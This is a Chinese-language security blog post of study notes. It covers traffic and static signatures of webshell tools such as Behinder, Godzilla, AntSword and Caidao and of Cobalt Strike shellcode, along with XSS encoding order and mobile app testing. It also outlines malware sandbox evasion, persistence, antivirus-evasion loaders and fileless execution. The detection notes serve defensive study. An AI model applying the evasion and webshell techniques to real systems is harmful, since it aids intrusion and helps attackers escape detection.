

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/bz.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="z2zQAQ">
  <meta name="keywords" content="">
  
    <meta name="description" content="概念性质的记录一些知识">
<meta property="og:type" content="article">
<meta property="og:title" content="web知识">
<meta property="og:url" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/index.html">
<meta property="og:site_name" content="Welcome to my world">
<meta property="og:description" content="概念性质的记录一些知识">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/ZkLLbV8PDoDXJ5xEqXUcebJKnJf.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/NGMtbsH4IoqQNSxSmDFckIJxnhb.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627110534196.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627110710381.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627110719051.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627111104232.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/LhlcbHJYfoayMNxlaQScjwZXn9c.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/Cuk1bYq8Boq2zqxstKXcOMWvnNd.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/YoZbbi8F5owxFqx29Ajcura9ndb.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/GGJgbeXjJozLdNxmIdscfVaXnJe.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/GQz6bAqwuoEeocxKyUfcHWaVnnh.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/UIlfbtq5QozI0KxTerbc0YX2n4f.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/TB3zb4yneoiyxsx134scH38Mngc.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/PdyMb33REou8X1xZiL3cCVjPnMh.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/WC0NbySPLoRKBpxd60QcflHbnKd.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/Rfedb2I1KoKqtAx3twfcd87FnTa.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/KWtlbPdXSoJd9gxjZo9cC6opnnh.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/Kpbcb10APoZLuQxqpoJcQrfgnwd.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/20240618171234-e65c2f2c-2d52-1.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241129094601977.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241129094707370-17328448279952.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241129094818483-17328448989563.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241129095125508.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241129095258496.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/Hjw5b5XHQofnYuxKsuoc4D6Bnzg.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/BFVPbPpJjo19anxOaf3cGbFmncf.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/HT0TbHBsZoo4QUxSpaRc5kH3nFf.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/Skekbkecbomq9QxJHFvcVk4onHh.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/J2DobQIXpoIyVPxFzfpcux7Fnvd.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/QcR8bXl6vo1aMqxVCbncLLVpnqc.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/DPXqb3UMMoqOGIx7MsVcfzIinPg.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241127163323424.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241127163705453.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241127163805742.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241127164919024.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241127165012947.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241127170940753.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627173315087.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627173252656.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627173423213.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240906104037469.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/Su01byOoWoZ48pxdmpUc24l5nud.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/Dv0UbKkPeoWXlUx6jJ0cEW5Anvc.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/WX10b59fboQWbixYrtYcVfG1nLb.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/WeWEbB3xWojY1Qxt1oUchbdinSc.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/FHcRb7GQzoyOj4x05fxc6dAon7g.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/DYuWb0o8yocza9xZvffcxu82nye.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/1619186782_6082d45e9c3c5ec1d11fd.png!small">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/YG16bcSjfo3kQmxRwypcYzSGnRe.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/HZT7bYxxUoqQSyxHy5YcVnhEnPd.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/VaXxbvwCJo7MKOxdskScW8lyn7d.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/JshRb4zXqoPfyZx0Y6wcjU8Fn9b.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/WbcnbABAFoOopxxCnlrclP9LnWh.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/FbbPbLpz4oqm3DxlkuJc4zJVnUc.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/HJfEbVnLWoVRcGx2g4Cc8j5nnYg.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/ZOupbGWGUoZwV1x2DG5cXyTKnid.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/L2tUbrdnyo9QiTxKJTMc06mhnLc.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/SGwYbK3Z2o4dbSxgByrc8j45nif.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/SXVHbCgTuoXT3VxASFscTQv6nb2.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/Yz88bpKUBoiogBxG54WcIAA4n07.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/W8rubjDC8op8f7xYngNcAkgFn19.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/RMunbmJG5o06lsx4MhfcUmfinmd.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/NJ2Ib4fFqok4wXxSXEVcipkcnEe.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/YyCIbMQQEoMKQfxXRl0cT7Kcnyd.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/AQVWbiG1YoPy1AxHXyxcBE0snJf.png">
<meta property="og:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/MUISbyRGeoUEZBxa0TLc7HKOnkc.png">
<meta property="article:published_time" content="2024-09-16T12:11:58.000Z">
<meta property="article:modified_time" content="2024-12-19T03:04:32.773Z">
<meta property="article:author" content="z2zQAQ">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2024/09/16/web%E7%9F%A5%E8%AF%86/ZkLLbV8PDoDXJ5xEqXUcebJKnJf.png">
  
  
  
  <title>web知识 - Welcome to my world</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/cloudedGlass.css">
<link rel="stylesheet" href="/z2z_custom/custom.css">
<link rel="stylesheet" href="/css/mac.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":80,"cursorChar":"__","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>z2zQAQ</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/moon.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="web知识"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-09-16 20:11" pubdate>
          2024年9月16日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          18k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          147 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">web知识</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="WEB-知识点"><a href="#WEB-知识点" class="headerlink" title="WEB 知识点"></a>WEB 知识点</h1><p>用来记一些知识点的概念</p>
<p>最近主要学java安全</p>
<h1 id="绕沙箱"><a href="#绕沙箱" class="headerlink" title="绕沙箱"></a>绕沙箱</h1><ul>
<li>检查所有进程id，无常见进程则不运行</li>
<li>查注册表反虚拟机</li>
<li>IsDebuggerPresent反调试（非0则退出）</li>
<li>写入注册表开机启动</li>
<li>raw+aes</li>
<li>系统服务</li>
<li>转移</li>
</ul>
<h1 id="防溯源"><a href="#防溯源" class="headerlink" title="防溯源"></a>防溯源</h1><p><a target="_blank" rel="noopener" href="https://github.com/aplyc1a/blogs/blob/master/%E8%BA%B2%E9%81%BF%E6%A3%80%E6%B5%8B/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%9A%90%E8%97%8F.md#31-%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E6%8C%87%E7%BA%B9">blogs&#x2F;躲避检测&#x2F;渗透测试中的身份隐藏.md at master · aplyc1a&#x2F;blogs (github.com)</a></p>
<h1 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h1><h2 id="cs-shellcode"><a href="#cs-shellcode" class="headerlink" title="cs shellcode"></a>cs shellcode</h2><p>1、RWX（可读可写可执⾏）权限的内存空间</p>
<p>2、异或密钥固定，3.x 是 0x69，4.x 是 0x2e</p>
<p>3、命名管道名称字符串</p>
<p>\\.\pipe\MSSE-1676-server</p>
<p>%c%c%c%c%c%c%c%cMSSE-%d-sever</p>
<h2 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h2><h3 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h3><p>1.0</p>
<ul>
<li>Content-Type: application&#x2F;octet-stream</li>
<li>Accpet头：application&#x2F;xhtml+xmlapplication&#x2F;xmlapplication&#x2F;signed-exchange</li>
</ul>
<p>2.0</p>
<ul>
<li>动态秘钥 </li>
<li>内置UA头</li>
<li>AES+BASE64</li>
<li>Content-Length: 16</li>
</ul>
<p>3.0</p>
<ul>
<li><p>默认密码 <strong>rebeyond</strong></p>
</li>
<li><p>content-type <strong>application&#x2F;octet-stream</strong></p>
</li>
<li><p>Accept 头<code>application/xhtml+xmlapplication/xmlapplication/signed-exchange</code></p>
</li>
</ul>
<p>4.0</p>
<ul>
<li>默认密码rebeyond</li>
<li>Accept : <strong>application&#x2F;json, text&#x2F;javascript, &#x2F;; q&#x3D;0.01</strong> 意思是浏览器可接受任何文件</li>
<li>大端口 长连接</li>
</ul>
<h3 id="1-0"><a href="#1-0" class="headerlink" title="1.0"></a>1.0</h3><p>1.Accpet 头 application&#x2F;xhtml+xmlapplication&#x2F;xmlapplication&#x2F;signed-exchange</p>
<p>2.<code>Content-Type: application/octet-stream</code> 这是一个强特征，查阅资料可知 octet-stream 的意思是，<strong>只能提交二进制，而且只能提交一个二进制，</strong>如果提交文件的话，只能提交一个文件,后台接收参数只能有一个，而且只能是流（或者字节数组），所以很少使用</p>
<h3 id="2-0"><a href="#2-0" class="headerlink" title="2.0"></a>2.0</h3><p>1.使用 <strong>AES+base64</strong>,AES 使用动态秘钥进行加密。</p>
<p>2.请求的时候内置了<strong>十几个 UA</strong> 头，（导致频繁变化）</p>
<p>3.<strong>Content-Length: 16</strong></p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/ZkLLbV8PDoDXJ5xEqXUcebJKnJf.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/NGMtbsH4IoqQNSxSmDFckIJxnhb.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="3-0"><a href="#3-0" class="headerlink" title="3.0"></a>3.0</h3><blockquote>
<p>在冰蝎中，任何请求，最终都会调用 Utils.getData 函数，对请求的参数加密。对于上传文件，命令执行来讲，加密的参数不定长。但是对于密钥交互，获取基本信息来讲，payload 都为定长，且无随机 padding。</p>
</blockquote>
<p>1.<strong>固定链接秘钥</strong></p>
<p>2.webshell 默认密码 <strong>rebeyond</strong>（md5(‘rebeyond’)[0:16]&#x3D;e45e329feb5d925b）</p>
<p>3.连接 jsp 的数据包 content-type常见为 <strong>application&#x2F;octet-stream</strong></p>
<p>4.Accept 头 <code>application/xhtml+xmlapplication/xmlapplication/signed-exchange</code></p>
<h3 id="4-0"><a href="#4-0" class="headerlink" title="4.0"></a>4.0</h3><p>1.取消连接密码，自定义传输协议算法，默认连接密码 <strong>rebeyond</strong> (md5(‘rebeyond’)[0:16]&#x3D;e45e329feb5d925b)</p>
<p>2.Accept 字段（弱特征）通常是: <strong>application&#x2F;json, text&#x2F;javascript, &#x2F;; q&#x3D;0.01</strong> 意思是浏览器可接受任何文件，但最倾向 application&#x2F;json 和 text&#x2F;javascript。<br>3.Content-Type 字段（弱特征），通常是 Content-type: Application&#x2F;x-www-form-urlencoded<br>4.连接使用本地端口在 49700 左右(<strong>就是比较大的端口</strong>)，每连接一次，每建立一次新的连接，端口就依次增加。<br>5.使用<strong>长连接</strong>，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection：Keep-Alive<br>6.固定的<strong>请求头和响应头</strong>，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg&#x2F;M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd</p>
<h2 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h2><p>类似冰蝎 2.0 的密钥交换方式，webshell 动态生成</p>
<p><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla/releases">https://github.com/BeichenDream/Godzilla/releases</a></p>
<h3 id="重点-1"><a href="#重点-1" class="headerlink" title="重点"></a>重点</h3><ul>
<li>请求包pass&#x3D;”xxx”</li>
<li>响应包为 0</li>
<li>md5 前十六位 +base64+md5 后十六位。</li>
</ul>
<h3 id="静态特征"><a href="#静态特征" class="headerlink" title="静态特征"></a><strong>静态特征</strong></h3><p>  在默认脚本编码的情况下，jsp 会出现 xc、pass 字符和 Java 反射(ClassLoader，getClass().getClassLoader())，base64 加解码等特征。</p>
<h3 id="动态特征"><a href="#动态特征" class="headerlink" title="动态特征"></a><strong>动态特征</strong></h3><p>  1.Accept 字段（弱特征），默认是 <code>Accept:text/html, image/gif, image/jpeg, *; q=.2, /; q=.2</code><br>  2.Cookie 中有一个非常关键的特征，最后会有个分号。估计后续的版本会修复。<br>  3.响应体的数据有一定特征，哥斯拉会把一个 32 位的 md5 字符串按照一半拆分，分别放在 base64 编码的数据的前后两部分。整个响应包的结构体征为：<strong>md5 前十六位 +base64+md5 后十六位。</strong><br>  4.请求包长度 <strong>52541</strong><br>  5.以 <code>pass=“xxxx”</code> 开始请求包<br>  6.请求包较长，响应包为 0<br>  7.一个 tcp 包里面有三个 http<br>  8.一共 6 个 http 报文，3 去 3 回</p>
<h2 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a><strong>蚁剑</strong></h2><h3 id="重点-2"><a href="#重点-2" class="headerlink" title="重点"></a>重点</h3><ul>
<li>UA头 antsword xxx （在&#x2F;modules&#x2F;request.js中可修改）</li>
<li>@ini_set(“displyad_errors”,”0”)</li>
<li>_0x参数</li>
</ul>
<h3 id="静态特征-1"><a href="#静态特征-1" class="headerlink" title="静态特征"></a><strong>静态特征</strong></h3><p>  蚁剑中 php 使用 assert、eval 执行；asp 只有 eval 执行；在 jsp 使用的是 Java 类加载（ClassLoader），同时会带有 base64 编码解码等字符特征。</p>
<h3 id="动态特征-1"><a href="#动态特征-1" class="headerlink" title="动态特征"></a><strong>动态特征</strong></h3><p>  1.我们使用一句话木马上传 webshell，抓包后会发现每个请求体都存在以 <code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0)</code> 开头。<br>  2.并且响应体的返回结果是 base64 编码发混淆字符，格式为：随机数 结果 随机数。<br>  3.参数名大多以“_0x…..&#x3D;”这种形式（下划线可替换为其他）所以，以_0x 开头的参数名，后面为加密数据的数据包也可识别为蚁剑的流量特征。</p>
<p>4.UA 头是 antsword xxx</p>
<h2 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a><strong>菜刀</strong></h2><h3 id="重点-3"><a href="#重点-3" class="headerlink" title="重点"></a>重点</h3><ul>
<li><strong>base64</strong></li>
<li><strong>z0 z1参数</strong></li>
</ul>
<h3 id="动态特征-2"><a href="#动态特征-2" class="headerlink" title="动态特征"></a><strong>动态特征</strong></h3><p>  1.payload 在请求体中，采用 url 编码 +base64 编码，<strong>payload 部分是明文传输</strong>。<br>  2.payload 中有 eval 或 assert、base64_decode 这样的字符。<br>  3.payload 中有默认固定的&amp;z0&#x3D;QGluaV9zZXQ…这样 base64 加密的攻击载荷<br>  4.参数 <strong>z0</strong> 对应 <code>$_POST[z0]</code> 接收到的数据，且固定为 QGluaV9zZXQ 开头。<br>  5.进行 base64 解码后可看到代码：<code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);</code> 这段意思是首先关闭报错和 magic_quotes，接下来去获取主机的信息。</p>
<h1 id="web解析与编码"><a href="#web解析与编码" class="headerlink" title="web解析与编码"></a>web解析与编码</h1><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1516371">浏览器解析与编码顺序及xss挖掘绕过全汇总-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><h3 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h3><p>%接ascil字符</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627110534196.png" srcset="/img/loading.gif" lazyload alt="image-20240627110534196"></p>
<h3 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h3><p>&amp;开头；结尾。</p>
<p>中间英文或者#后接十进制数或#x后接十六进制数。<img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627110710381.png" srcset="/img/loading.gif" lazyload alt="image-20240627110710381"></p>
<h3 id="JS编码"><a href="#JS编码" class="headerlink" title="JS编码"></a>JS编码</h3><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627110719051.png" srcset="/img/loading.gif" lazyload alt="image-20240627110719051"></p>
<h2 id="解析顺序"><a href="#解析顺序" class="headerlink" title="解析顺序"></a>解析顺序</h2><p>浏览器解析：HTML文档被解析，生成DOM树和css样式表，遇到&lt;script&gt;标签的时候将控制权交给JS引擎</p>
<p>由于需要先生成DOM树再解析html编码内容，所以不可以将标签进行html编码<img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627111104232.png" srcset="/img/loading.gif" lazyload alt="image-20240627111104232"></p>
<h2 id="解码顺序"><a href="#解码顺序" class="headerlink" title="解码顺序"></a>解码顺序</h2><p>HTML解码。JS解码。URL解码。</p>
<h1 id="APP"><a href="#APP" class="headerlink" title="APP"></a>APP</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14037?time__1311=GqAxuDRD0D2AqGNPmxUo=D9DfhputYW4D#toc-2">APP测试保姆级教程 - 先知社区</a></p>
<p>过ROOT ：</p>
<p>FradiAntiRootDetection：hook底层禁止检测su（那么其实也可以直接hook对应检测函数），Apatch框架，还有狐狸面具+shamiko、KSU框架都可以过root检测</p>
<p>抓包代理：根证书手动设置，SSLUnpinning和算法助手</p>
<p>脱壳：为了可以用jadx反编译，先用MT管理器或者找一些文件资源的功能点查壳，然后用Fundex等软件脱壳</p>
<p>HOOK函数：Frida（hluda）</p>
<h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><h2 id="免杀方法"><a href="#免杀方法" class="headerlink" title="免杀方法"></a><strong>免杀方法</strong></h2><ol>
<li>修改特征码，猜测杀软对哪几个字节进行查杀，再对应修改（几乎没用了）</li>
<li>shellcode 加载器，改变加载到内存的方式和加密方式（主流）(分离免杀)</li>
<li>反射 dll 加载，把 dll 加密，远程下载到内存中再解密执行（高级）</li>
</ol>
<h3 id="无文件执行木马的方式有哪些？"><a href="#无文件执行木马的方式有哪些？" class="headerlink" title="无文件执行木马的方式有哪些？"></a><strong>无文件执行木马的方式有哪些？</strong></h3><p>powershell（脚本解析器） 》》》powershell.exe（应用程序）</p>
<p>VB.script（脚本解析器） 》》》cscript.exe（应用程序）</p>
<p>bat 处理 （脚本解析器） 》》》cmd.exe（应用程序）</p>
<p>javaSrtipt（脚本解析器） 》》》mshta.exe（应用程序）</p>
<h3 id="怎么做-shellcode-免杀？"><a href="#怎么做-shellcode-免杀？" class="headerlink" title="怎么做 shellcode 免杀？"></a><strong>怎么做 shellcode 免杀？</strong></h3><ol>
<li>编码</li>
<li>加壳</li>
<li>混淆</li>
<li>分离免杀</li>
<li>特征码修改</li>
<li>添加无用逻辑语句</li>
<li>重写 api</li>
</ol>
<h3 id="分离免杀怎么做？"><a href="#分离免杀怎么做？" class="headerlink" title="分离免杀怎么做？"></a><strong>分离免杀怎么做？</strong></h3><p>分为加载器和 shellcode 两部分，一般将 shellcode 存储在网页或者图片中，然后加载器远程加载存在 shellcode 的网页或者图片之类的</p>
<h3 id="powershell-怎么远程加载？"><a href="#powershell-怎么远程加载？" class="headerlink" title="powershell 怎么远程加载？"></a><strong>powershell 怎么远程加载？</strong></h3><p>可以远程加载 mimikazt，远控文件，exe 可执行文件实现无文件落地</p>
<h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><p>1.高版本 php 不换行执行命令</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/LhlcbHJYfoayMNxlaQScjwZXn9c.png" srcset="/img/loading.gif" lazyload></p>
